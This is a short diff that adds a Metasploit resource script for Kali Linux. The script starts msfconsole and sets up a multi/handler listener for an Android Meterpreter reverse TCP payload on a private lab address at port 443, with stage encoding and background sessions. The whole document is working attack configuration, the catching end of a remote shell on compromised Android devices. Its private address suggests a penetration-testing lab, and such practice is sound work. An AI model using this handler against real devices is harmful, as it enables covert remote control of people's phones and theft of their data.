@@ -1,0 +1,11 @@
+#
+# [Kali]: msfdb start; msfconsole -q -r '/home/kali/android-meterpreter-stageless-reverse-tcp-443-apk.rc'
+#
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.119.128
+set LPORT 443
+set ExitOnSession false
+set EnableStageEncoding true
+#set AutoRunScript 'post/windows/manage/migrate'
+run -j
